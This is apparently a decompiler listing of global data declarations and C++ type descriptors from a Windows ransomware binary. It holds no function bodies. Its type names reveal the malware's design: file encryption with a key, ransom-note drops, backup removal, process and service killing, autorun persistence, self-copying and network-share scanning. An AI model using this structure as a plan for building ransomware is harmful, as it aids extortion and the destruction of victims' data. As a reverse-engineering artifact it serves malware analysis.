void *dword_4F9E80 = NULL; // idb
int dword_4F9E90 = 0; // weak
int dword_4F9E94 = 15; // weak
void *dword_4F9E98 = NULL; // idb
int dword_4F9EA8 = 0; // weak
int dword_4F9EAC = 15; // weak
void *dword_4F9EB0 = NULL; // idb
int dword_4F9EC0 = 0; // weak
int dword_4F9EC4 = 15; // weak
void *dword_4F9EC8 = NULL; // idb
int dword_4F9ED8 = 0; // weak
int dword_4F9EDC = 15; // weak
void *dword_4F9EE0 = NULL; // idb
int dword_4F9EF0 = 0; // weak
int dword_4F9EF4 = 15; // weak
void *dword_4F9EF8 = NULL; // idb
int dword_4F9F08 = 0; // weak
int dword_4F9F0C = 15; // weak
void *dword_4F9F10 = NULL; // idb
int dword_4F9F20 = 0; // weak
int dword_4F9F24 = 15; // weak
void *dword_4F9F28 = NULL; // idb
int dword_4F9F38 = 0; // weak
int dword_4F9F3C = 15; // weak
void *dword_4F9F40 = NULL; // idb
int dword_4F9F50 = 0; // weak
int dword_4F9F54 = 15; // weak
void *dword_4F9F58 = NULL; // idb
int dword_4F9F68 = 0; // weak
int dword_4F9F6C = 15; // weak
void *dword_4F9F70 = NULL; // idb
int dword_4F9F80 = 0; // weak
int dword_4F9F84 = 15; // weak
void *dword_4F9F88 = NULL; // idb
int dword_4F9F98 = 0; // weak
int dword_4F9F9C = 15; // weak
void *dword_4F9FA0 = NULL; // idb
int dword_4F9FB0 = 0; // weak
int dword_4F9FB4 = 15; // weak
void *dword_4F9FB8 = NULL; // idb
int dword_4F9FC8 = 0; // weak
int dword_4F9FCC = 15; // weak
void *dword_4F9FD0 = NULL; // idb
int dword_4F9FE0 = 0; // weak
int dword_4F9FE4 = 15; // weak
void *dword_4F9FE8 = NULL; // idb
int dword_4F9FF8 = 0; // weak
int dword_4F9FFC = 15; // weak
void *dword_4FA000 = NULL; // idb
int dword_4FA010 = 0; // weak
int dword_4FA014 = 15; // weak
void *dword_4FA018 = NULL; // idb
int dword_4FA028 = 0; // weak
int dword_4FA02C = 15; // weak
void *dword_4FA030 = NULL; // idb
int dword_4FA040 = 0; // weak
int dword_4FA044 = 15; // weak
void *dword_4FA048 = NULL; // idb
int dword_4FA058 = 0; // weak
int dword_4FA05C = 15; // weak
void *dword_4FA060 = NULL; // idb
int dword_4FA070 = 0; // weak
int dword_4FA074 = 15; // weak
void *dword_4FA078 = NULL; // idb
int dword_4FA088 = 0; // weak
int dword_4FA08C = 15; // weak
void *dword_4FA090 = NULL; // idb
int dword_4FA0A0 = 0; // weak
int dword_4FA0A4 = 15; // weak
void *dword_4FA0A8 = NULL; // idb
int dword_4FA0B8 = 0; // weak
int dword_4FA0BC = 15; // weak
void *dword_4FA0C0 = NULL; // idb
int dword_4FA0D0 = 0; // weak
int dword_4FA0D4 = 15; // weak
void *dword_4FA0D8 = NULL; // idb
int dword_4FA0E8 = 0; // weak
int dword_4FA0EC = 15; // weak
void *dword_4FA0F0 = NULL; // idb
size_t dword_4FA100 = 0u; // idb
int dword_4FA104 = 15; // weak
void *dword_4FA108 = NULL; // idb
int dword_4FA118 = 0; // weak
int dword_4FA11C = 15; // weak
void *dword_4FA120 = NULL; // idb
int dword_4FA130 = 0; // weak
int dword_4FA134 = 15; // weak
void *dword_4FA138 = NULL; // idb
int dword_4FA148 = 0; // weak
int dword_4FA14C = 15; // weak
void *dword_4FA150 = NULL; // idb
int dword_4FA160 = 0; // weak
int dword_4FA164 = 15; // weak
void *dword_4FA168 = NULL; // idb
int dword_4FA178 = 0; // weak
int dword_4FA17C = 15; // weak
void *dword_4FA180 = NULL; // idb
int dword_4FA190 = 0; // weak
int dword_4FA194 = 15; // weak
void *dword_4FA198 = NULL; // idb
int dword_4FA1A8 = 0; // weak
int dword_4FA1AC = 15; // weak
void *dword_4FA1B0 = NULL; // idb
int dword_4FA1C0 = 0; // weak
int dword_4FA1C4 = 15; // weak
void *dword_4FA1C8 = NULL; // idb
int dword_4FA1D8 = 0; // weak
int dword_4FA1DC = 15; // weak
void *dword_4FA1E0 = NULL; // idb
int dword_4FA1F0 = 0; // weak
int dword_4FA1F4 = 15; // weak
void *dword_4FA1F8 = NULL; // idb
int dword_4FA208 = 0; // weak
int dword_4FA20C = 15; // weak
void *dword_4FA210 = NULL; // idb
int dword_4FA220 = 0; // weak
int dword_4FA224 = 15; // weak
void *dword_4FA228 = NULL; // idb
int dword_4FA238 = 0; // weak
int dword_4FA23C = 15; // weak
void *dword_4FA240 = NULL; // idb
int dword_4FA250 = 0; // weak
int dword_4FA254 = 15; // weak
void *dword_4FA258 = NULL; // idb
int dword_4FA268 = 0; // weak
int dword_4FA26C = 15; // weak
void *dword_4FA270 = NULL; // idb
int dword_4FA280 = 0; // weak
int dword_4FA284 = 15; // weak
void *dword_4FA288 = NULL; // idb
int dword_4FA298 = 0; // weak
int dword_4FA29C = 15; // weak
void *dword_4FA2A0 = NULL; // idb
int dword_4FA2B0 = 0; // weak
int dword_4FA2B4 = 15; // weak
void *dword_4FA2B8 = NULL; // idb
int dword_4FA2C8 = 0; // weak
int dword_4FA2CC = 15; // weak
void *dword_4FA2D0 = NULL; // idb
int dword_4FA2E0 = 0; // weak
int dword_4FA2E4 = 15; // weak
void *dword_4FA2E8 = NULL; // idb
int dword_4FA2F8 = 0; // weak
int dword_4FA2FC = 15; // weak
void *dword_4FA300 = NULL; // idb
int dword_4FA310 = 0; // weak
int dword_4FA314 = 15; // weak
void *dword_4FA318 = NULL; // idb
int dword_4FA328 = 0; // weak
int dword_4FA32C = 15; // weak
void *dword_4FA330 = NULL; // idb
int dword_4FA340 = 0; // weak
int dword_4FA344 = 15; // weak
void *dword_4FA348 = NULL; // idb
int dword_4FA358 = 0; // weak
int dword_4FA35C = 15; // weak
void *dword_4FA360 = NULL; // idb
int dword_4FA370 = 0; // weak
int dword_4FA374 = 15; // weak
void *dword_4FA378 = NULL; // idb
int dword_4FA388 = 0; // weak
int dword_4FA38C = 15; // weak
void *dword_4FA390 = NULL; // idb
int dword_4FA3A0 = 0; // weak
int dword_4FA3A4 = 15; // weak
void *dword_4FA3A8 = NULL; // idb
int dword_4FA3B8 = 0; // weak
int dword_4FA3BC = 15; // weak
void *dword_4FA3C0 = NULL; // idb
int dword_4FA3D0 = 0; // weak
int dword_4FA3D4 = 15; // weak
void *dword_4FA3D8 = NULL; // idb
int dword_4FA3E8 = 0; // weak
int dword_4FA3EC = 15; // weak
void *dword_4FA3F0 = NULL; // idb
int dword_4FA400 = 0; // weak
int dword_4FA404 = 15; // weak
void *dword_4FA408 = NULL; // idb
int dword_4FA418 = 0; // weak
int dword_4FA41C = 15; // weak
void *dword_4FA420 = NULL; // idb
int dword_4FA430 = 0; // weak
int dword_4FA434 = 15; // weak
void *dword_4FA438 = NULL; // idb
int dword_4FA448 = 0; // weak
int dword_4FA44C = 15; // weak
void *dword_4FA450 = NULL; // idb
int dword_4FA460 = 0; // weak
int dword_4FA464 = 15; // weak
void *dword_4FA468 = NULL; // idb
int dword_4FA478 = 0; // weak
int dword_4FA47C = 15; // weak
void *dword_4FA480 = NULL; // idb
int dword_4FA490 = 0; // weak
int dword_4FA494 = 15; // weak
void *dword_4FA498 = NULL; // idb
int dword_4FA4A8 = 0; // weak
int dword_4FA4AC = 15; // weak
void *dword_4FA4B0 = NULL; // idb
int dword_4FA4C0 = 0; // weak
int dword_4FA4C4 = 15; // weak
void *dword_4FA4C8 = NULL; // idb
int dword_4FA4D8 = 0; // weak
int dword_4FA4DC = 15; // weak
void *dword_4FA4E0 = NULL; // idb
int dword_4FA4F0 = 0; // weak
int dword_4FA4F4 = 15; // weak
void *dword_4FA4F8 = NULL; // idb
int dword_4FA508 = 0; // weak
int dword_4FA50C = 15; // weak
void *dword_4FA510 = NULL; // idb
int dword_4FA520 = 0; // weak
int dword_4FA524 = 15; // weak
void *dword_4FA528 = NULL; // idb
int dword_4FA538 = 0; // weak
int dword_4FA53C = 15; // weak
void *dword_4FA540 = NULL; // idb
int dword_4FA550 = 0; // weak
int dword_4FA554 = 15; // weak
void *dword_4FA558 = NULL; // idb
int dword_4FA568 = 0; // weak
int dword_4FA56C = 15; // weak
void *dword_4FA570 = NULL; // idb
int dword_4FA580 = 0; // weak
int dword_4FA584 = 15; // weak
void *dword_4FA588 = NULL; // idb
int dword_4FA598 = 0; // weak
int dword_4FA59C = 15; // weak
void *dword_4FA5A0 = NULL; // idb
int dword_4FA5B0 = 0; // weak
int dword_4FA5B4 = 15; // weak
void *dword_4FA5B8 = NULL; // idb
int dword_4FA5C8 = 0; // weak
int dword_4FA5CC = 15; // weak
void *dword_4FA5D0 = NULL; // idb
int dword_4FA5E0 = 0; // weak
int dword_4FA5E4 = 15; // weak
void *dword_4FA5E8 = NULL; // idb
int dword_4FA5F8 = 0; // weak
int dword_4FA5FC = 15; // weak
void *dword_4FA600 = NULL; // idb
int dword_4FA610 = 0; // weak
int dword_4FA614 = 15; // weak
void *dword_4FA618 = NULL; // idb
int dword_4FA628 = 0; // weak
int dword_4FA62C = 15; // weak
void *dword_4FA630 = NULL; // idb
int dword_4FA640 = 0; // weak
int dword_4FA644 = 15; // weak
void *dword_4FA648 = NULL; // idb
int dword_4FA658 = 0; // weak
int dword_4FA65C = 15; // weak
void *dword_4FA660 = NULL; // idb
int dword_4FA670 = 0; // weak
int dword_4FA674 = 15; // weak
void *dword_4FA678 = NULL; // idb
int dword_4FA688 = 0; // weak
int dword_4FA68C = 15; // weak
void *dword_4FA690 = NULL; // idb
int dword_4FA6A0 = 0; // weak
int dword_4FA6A4 = 15; // weak
void *dword_4FA6A8 = NULL; // idb
int dword_4FA6B8 = 0; // weak
int dword_4FA6BC = 15; // weak
void *dword_4FA6C0 = NULL; // idb
int dword_4FA6D0 = 0; // weak
int dword_4FA6D4 = 15; // weak
void *dword_4FA6D8 = NULL; // idb
int dword_4FA6E8 = 0; // weak
int dword_4FA6EC = 15; // weak
void *dword_4FA6F0 = NULL; // idb
int dword_4FA700 = 0; // weak
int dword_4FA704 = 15; // weak
void *dword_4FA708 = NULL; // idb
int dword_4FA718 = 0; // weak
int dword_4FA71C = 15; // weak
void *dword_4FA720 = NULL; // idb
int dword_4FA730 = 0; // weak
int dword_4FA734 = 15; // weak
void *dword_4FA738 = NULL; // idb
int dword_4FA748 = 0; // weak
int dword_4FA74C = 15; // weak
void *dword_4FA750 = NULL; // idb
int dword_4FA760 = 0; // weak
int dword_4FA764 = 15; // weak
void *dword_4FA768 = NULL; // idb
int dword_4FA778 = 0; // weak
int dword_4FA77C = 15; // weak
void *dword_4FA780 = NULL; // idb
int dword_4FA790 = 0; // weak
int dword_4FA794 = 15; // weak
void *dword_4FA798 = NULL; // idb
int dword_4FA7A8 = 0; // weak
int dword_4FA7AC = 15; // weak
void *dword_4FA7B0 = NULL; // idb
int dword_4FA7C0 = 0; // weak
int dword_4FA7C4 = 15; // weak
void *dword_4FA7C8 = NULL; // idb
int dword_4FA7D8 = 0; // weak
int dword_4FA7DC = 15; // weak
void *dword_4FA7E0 = NULL; // idb
int dword_4FA7F0 = 0; // weak
int dword_4FA7F4 = 15; // weak
void *dword_4FA7F8 = NULL; // idb
int dword_4FA808 = 0; // weak
int dword_4FA80C = 15; // weak
void *dword_4FA810 = NULL; // idb
int dword_4FA820 = 0; // weak
int dword_4FA824 = 15; // weak
void *dword_4FA828 = NULL; // idb
int dword_4FA838 = 0; // weak
int dword_4FA83C = 15; // weak
void *dword_4FA840 = NULL; // idb
int dword_4FA850 = 0; // weak
int dword_4FA854 = 15; // weak
void *dword_4FA858 = NULL; // idb
int dword_4FA868 = 0; // weak
int dword_4FA86C = 15; // weak
void *dword_4FA870 = NULL; // idb
int dword_4FA880 = 0; // weak
int dword_4FA884 = 15; // weak
void *dword_4FA888 = NULL; // idb
int dword_4FA898 = 0; // weak
int dword_4FA89C = 15; // weak
void *dword_4FA8A0 = NULL; // idb
int dword_4FA8B0 = 0; // weak
int dword_4FA8B4 = 15; // weak
void *dword_4FA8B8 = NULL; // idb
int dword_4FA8C8 = 0; // weak
int dword_4FA8CC = 15; // weak
void *dword_4FA8D0 = NULL; // idb
int dword_4FA8E0 = 0; // weak
int dword_4FA8E4 = 15; // weak
void *dword_4FA8E8 = NULL; // idb
int dword_4FA8F8 = 0; // weak
int dword_4FA8FC = 15; // weak
void *dword_4FA900 = NULL; // idb
int dword_4FA910 = 0; // weak
int dword_4FA914 = 15; // weak
void *dword_4FA918 = NULL; // idb
int dword_4FA928 = 0; // weak
int dword_4FA92C = 15; // weak
void *dword_4FA930 = NULL; // idb
int dword_4FA940 = 0; // weak
int dword_4FA944 = 15; // weak
void *dword_4FA948 = NULL; // idb
int dword_4FA958 = 0; // weak
int dword_4FA95C = 15; // weak
void *dword_4FA960 = NULL; // idb
int dword_4FA970 = 0; // weak
int dword_4FA974 = 15; // weak
void *dword_4FA978 = NULL; // idb
int dword_4FA988 = 0; // weak
int dword_4FA98C = 15; // weak
void *dword_4FA990 = NULL; // idb
int dword_4FA9A0 = 0; // weak
int dword_4FA9A4 = 15; // weak
void *dword_4FA9A8 = NULL; // idb
int dword_4FA9B8 = 0; // weak
int dword_4FA9BC = 15; // weak
void *dword_4FA9C0 = NULL; // idb
int dword_4FA9D0 = 0; // weak
int dword_4FA9D4 = 15; // weak
void *dword_4FA9D8 = NULL; // idb
int dword_4FA9E8 = 0; // weak
int dword_4FA9EC = 15; // weak
void *dword_4FA9F0 = NULL; // idb
int dword_4FAA00 = 0; // weak
int dword_4FAA04 = 15; // weak
void *dword_4FAA08 = NULL; // idb
int dword_4FAA18 = 0; // weak
int dword_4FAA1C = 15; // weak
struct TypeDescriptor Concurrency::details::ExecutionResource `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AVExecutionResource@details@Concurrency@@" }; // idb
struct TypeDescriptor Concurrency::IExecutionResource `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUIExecutionResource@Concurrency@@" }; // idb
void **___R0_AV_lambda_1___7___R0_4___ScheduleContinuationTask__Task_impl_base_details_Concurrency__QAEXPAU_ContinuationTaskHandleBase_34__Z_QBE_XZ__8 = &type_info::`vftable'; // weak
void **___R0_AV_lambda_1___1___MakeVoidToUnitFunc_details_Concurrency__YA_AV__function___A6AEXZ_std__ABV__function___A6AXXZ_5__Z__8 = &type_info::`vftable'; // weak
void **___R0_AV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__2__Z__8 = &type_info::`vftable'; // weak
void **___R0_AV_lambda_1___CC____CancelAndRunContinuations____Task_impl_E_details_Concurrency__UAE_N_N00ABV__shared_ptr_U_ExceptionHolder_details_Concurrency___std___Z__8 = &type_info::`vftable'; // weak
void **___R0_AV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std___8 = &type_info::`vftable'; // weak
void **___R0_AV_lambda_1___4___ScheduleContinuationTask__Task_impl_base_details_Concurrency__QAEXPAU_ContinuationTaskHandleBase_34__Z__8 = &type_info::`vftable'; // weak
struct TypeDescriptor ANEventDropNote `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventDropNote@@" }; // idb
struct TypeDescriptor ANIEvent `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANIEvent@@" }; // idb
struct TypeDescriptor ANEventGetServices `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetServices@@" }; // idb
struct TypeDescriptor ANEventGetPublicKey `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetPublicKey@@" }; // idb
void **std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &> `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct TypeDescriptor ANEventGetBuildType `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetBuildType@@" }; // idb
struct TypeDescriptor ANEventGetNoteName `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetNoteName@@" }; // idb
struct TypeDescriptor ANEventGetEncryptExtensionsIgnore `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetEncryptExtensionsIgnore@@" }; // idb
struct TypeDescriptor ANEventGetEncKey `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetEncKey@@" }; // idb
struct TypeDescriptor ANEventGetLid `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetLid@@" }; // idb
struct TypeDescriptor ANEventGetExtension `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetExtension@@" }; // idb
struct TypeDescriptor ANEventGetNoteText `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetNoteText@@" }; // idb
struct TypeDescriptor ANEventPutToNote `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventPutToNote@@" }; // idb
struct TypeDescriptor ANEventGetInterval `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetInterval@@" }; // idb
struct TypeDescriptor ANEventGetProcesses `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetProcesses@@" }; // idb
struct TypeDescriptor ANEventGetEncryptExtensionsFull `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetEncryptExtensionsFull@@" }; // idb
struct TypeDescriptor ANEventCryptFile `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventCryptFile@@" }; // idb
struct TypeDescriptor ANEventGetID `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetID@@" }; // idb
void **std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &> `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct TypeDescriptor ANEventSmartScan `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventSmartScan@@" }; // idb
struct TypeDescriptor ANEventInitFileProcess `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventInitFileProcess@@" }; // idb
struct TypeDescriptor ANEventScanFileSystem `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventScanFileSystem@@" }; // idb
struct TypeDescriptor ANEventScanFileSystemAsync `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventScanFileSystemAsync@@" }; // idb
void **___R0_AV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___2__Z__8 = &type_info::`vftable'; // weak
void **std::_Fake_no_copy_callable_adapter<void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,ANEventScanFileSystem> `RTTI Type Descriptor' = &type_info::`vftable'; // weak
void **std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &> `RTTI Type Descriptor' = &type_info::`vftable'; // weak
void **___R0_AV_lambda_1___4__OnScanFileSystem_ANFileSystemScannerModule__AAEX__QAUANIEvent___Z__8 = &type_info::`vftable'; // weak
struct TypeDescriptor ANEventGetExternalIP `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventGetExternalIP@@" }; // idb
void **std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &> `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct TypeDescriptor ANEventShareScan `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventShareScan@@" }; // idb
struct TypeDescriptor ANEventDriveScan `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventDriveScan@@" }; // idb
struct TypeDescriptor ANEventHiddenDevicesScan `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventHiddenDevicesScan@@" }; // idb
void **std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &> `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct TypeDescriptor ANEventIsAdmin `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventIsAdmin@@" }; // idb
struct TypeDescriptor ANEventAddToAutorun `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventAddToAutorun@@" }; // idb
struct TypeDescriptor ANEventRemoveBackups `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventRemoveBackups@@" }; // idb
struct TypeDescriptor ANEventIsRunning `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventIsRunning@@" }; // idb
struct TypeDescriptor ANEventRunServices `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventRunServices@@" }; // idb
struct TypeDescriptor ANEventKillProcesses `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventKillProcesses@@" }; // idb
void **std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &> `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct TypeDescriptor ANEventCopySelf `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventCopySelf@@" }; // idb
struct TypeDescriptor ANEventStopServices `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventStopServices@@" }; // idb
struct TypeDescriptor ANEventRemoveServices `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUANEventRemoveServices@@" }; // idb
_UNKNOWN unk_4FF640; // weak
_UNKNOWN unk_4FF648; // weak
int dword_4FF64C = 0; // weak
_UNKNOWN unk_4FF654; // weak
_UNKNOWN unk_4FF6B0; // weak
_UNKNOWN unk_4FF6B8; // weak
int dword_4FF6BC = 0; // weak
_UNKNOWN unk_4FF6C4; // weak
_UNKNOWN unk_4FF724; // weak
_UNKNOWN unk_4FF754; // weak
_UNKNOWN unk_4FF758; // weak
int dword_4FF92C; // weak
_UNKNOWN unk_4FF930; // weak
struct _RTL_CRITICAL_SECTION stru_4FF938; // idb
struct _RTL_CRITICAL_SECTION stru_4FF998; // idb
_UNKNOWN unk_4FF9F8; // weak
_UNKNOWN unk_4FF9FC; // weak
_UNKNOWN unk_4FFA00; // weak
_UNKNOWN unk_4FFA04; // weak
int dword_4FFA08; // weak
int dword_4FFA0C; // weak
int dword_4FFA10; // weak
int dword_4FFA14; // weak
int dword_4FFA18; // weak
_UNKNOWN unk_4FFA24; // weak
_UNKNOWN unk_4FFA28; // weak
_UNKNOWN unk_4FFA2C; // weak
_UNKNOWN unk_4FFA30; // weak
_UNKNOWN unk_4FFA34; // weak
_DWORD dword_4FFA38; // weak
int dword_4FFA44; // weak
int dword_4FFAB4; // weak
int dword_4FFACC; // weak
_UNKNOWN unk_4FFAF0; // weak
_UNKNOWN unk_4FFAF4; // weak
_UNKNOWN unk_4FFAF8; // weak
_UNKNOWN unk_4FFAFC; // weak
_UNKNOWN unk_4FFB00; // weak
_UNKNOWN unk_4FFB04; // weak
_UNKNOWN unk_4FFB08; // weak
_UNKNOWN unk_4FFB0C; // weak
_UNKNOWN unk_4FFB10; // weak
_UNKNOWN unk_4FFB14; // weak
_UNKNOWN unk_4FFB18; // weak
_UNKNOWN unk_4FFB1C; // weak
_UNKNOWN unk_4FFB20; // weak
_UNKNOWN unk_4FFB24; // weak
_UNKNOWN unk_4FFB28; // weak
_UNKNOWN unk_4FFB2C; // weak
_UNKNOWN unk_4FFB30; // weak
_UNKNOWN unk_4FFB34; // weak
_UNKNOWN unk_4FFB38; // weak
_UNKNOWN unk_4FFB3C; // weak
_UNKNOWN unk_4FFB40; // weak
_UNKNOWN unk_4FFB44; // weak
int dword_4FFB48; // weak
int dword_4FFB4C; // weak
int dword_4FFB50; // weak
int dword_4FFB54; // weak
int dword_4FFB58; // weak
int dword_4FFB5C; // weak
int dword_4FFB60; // weak
int dword_4FFB64; // weak
int dword_4FFB68; // weak
int dword_4FFB6C; // weak
int dword_4FFB70; // weak
int dword_4FFB74; // weak
int dword_4FFB78; // weak
int dword_4FFB7C; // weak
int dword_4FFB80; // weak
int dword_4FFB84; // weak
int dword_4FFB88; // weak
int dword_4FFB8C; // weak
int dword_4FFB90; // weak
int dword_4FFB94; // weak
int dword_4FFB98; // weak
int dword_4FFB9C; // weak
int dword_4FFBA0; // weak
int dword_4FFBA4; // weak
int dword_4FFBA8; // weak
int dword_4FFBAC; // weak
_UNKNOWN unk_4FFBB0; // weak
_UNKNOWN unk_4FFBB4; // weak
_UNKNOWN unk_4FFBB8; // weak
_UNKNOWN unk_4FFBBC; // weak
_UNKNOWN unk_4FFBC0; // weak
_UNKNOWN unk_4FFBC4; // weak
_UNKNOWN unk_4FFBC8; // weak
_UNKNOWN unk_4FFBCC; // weak
int dword_4FFBD0; // weak
int dword_4FFBD4; // weak
int dword_4FFBD8; // weak
int dword_4FFBDC; // weak
int dword_4FFBE0; // weak
int dword_4FFBE4; // weak
int dword_4FFBE8; // weak
int dword_4FFBEC; // weak
_UNKNOWN unk_4FFC10; // weak
_UNKNOWN unk_4FFC11; // weak
int dword_4FFFA8; // weak
union _SLIST_HEADER stru_4FFFB8; // idb
_UNKNOWN unk_4FFFC0; // weak
int dword_4FFFC8; // weak
int dword_4FFFCC; // weak
int dword_4FFFD4; // weak
int dword_4FFFD8; // weak
int dword_4FFFDC; // weak
void *dword_4FFFE0; // idb
int dword_4FFFE8; // weak
HMODULE hLibModule; // idb
int dword_4FFFF0; // weak
int dword_500000; // weak
ULONG_PTR ProcessAffinityMask; // idb
ULONG_PTR SystemAffinityMask; // idb
int dword_50000C; // weak
void *dword_500010; // idb
int dword_500014; // weak
char byte_500018; // weak
int dword_50001C; // weak
int dword_500020; // weak
int dword_500024; // weak
DWORD ReturnedLength; // idb
void *Block; // idb
int dword_500030; // weak
int dword_500034; // weak
DWORD dword_500038; // idb
int dword_500040; // weak
int dword_500044; // weak
int dword_500050; // weak
int dword_500054; // weak
int dword_500058; // weak
int dword_50005C; // weak
union _SLIST_HEADER ListHead; // idb
int dword_500068; // weak
int dword_50006C; // weak
int dword_500070; // weak
int dword_500074; // weak
int dword_500078; // weak
__int32 dword_50007C; // weak
int dword_500080; // weak
int dword_500088; // weak
char byte_50008C; // weak
int dword_500090; // weak
int dword_500094; // weak
void *dword_500098; // idb
int dword_5000A0; // weak
int dword_5000A4; // weak
DWORD dwTlsIndex; // idb
signed __int32 dword_5000AC[19]; // weak
int dword_500124; // weak
int dword_5001A0; // weak
int dword_5001A8; // weak
int dword_5001B8; // weak
int dword_50031C; // weak
int dword_50052C; // weak
int dword_500530; // weak
void *dword_500534; // idb
void *dword_500538; // idb
_onexit_table_t stru_50053C; // idb
int dword_500554; // weak
int dword_500558; // weak
int dword_500560; // weak
int dword_500564; // weak
int dword_500568; // weak
struct __crt_locale_data *dword_50056C; // idb
int dword_500570; // weak
int dword_500574; // weak
int dword_500578; // weak
int dword_50057C; // weak
LPCRITICAL_SECTION lpCriticalSection[128]; // weak
int dword_500920; // weak
void *dword_500930; // idb
void *dword_500934; // idb
struct __crt_multibyte_data *dword_500958; // idb
HANDLE hHeap; // idb
int dword_500998; // weak
int dword_50099C; // weak
int dword_5009A0; // weak
_UNKNOWN unk_5009A4; // weak
_UNKNOWN unk_5009A8; // weak
_UNKNOWN unk_5009B0; // weak
_UNKNOWN unk_5009B4; // weak
int dword_5009BC; // weak
_UNKNOWN unk_5009C0; // weak
char byte_5009C4[]; // weak
_UNKNOWN unk_5009C5; // weak
_UNKNOWN unk_5009D8; // weak
int dword_5009E0; // weak
int dword_5009E4; // weak
int dword_5009E8; // weak
int dword_5009EC; // weak
char byte_5009F0; // weak
LPCSTR lpMultiByteStr; // idb
int dword_5009F8[]; // weak
int dword_500A78; // weak
char byte_500A7C[12]; // weak
int dword_500A88; // weak
int dword_500A8C; // weak
int dword_500A90; // weak
int dword_500A94; // weak
int dword_500A98; // weak
int dword_500A9C; // weak
char byte_500AA0; // weak
void *dword_500AA4; // idb
int dword_500AA8; // weak
int dword_500AAC; // weak
void *dword_500AB0; // idb
int dword_500AB4; // weak
int dword_500AB8; // weak
int dword_500ABC; // weak
int dword_500AC0; // weak
char byte_500AC4; // weak
LPCSTR dword_500AC8; // idb
int dword_500ACC; // weak
int dword_500AD0; // weak
int dword_500AD4; // weak
int dword_500AD8; // weak
int dword_500ADC; // weak
int dword_500AE0; // weak
int dword_500AE4; // weak
int dword_500AE8; // weak
char byte_500AEC; // weak
LPCSTR lpszLongPath; // idb
int dword_500AF4; // weak
_UNKNOWN unk_500AF8; // weak
int dword_500B0C[19]; // weak
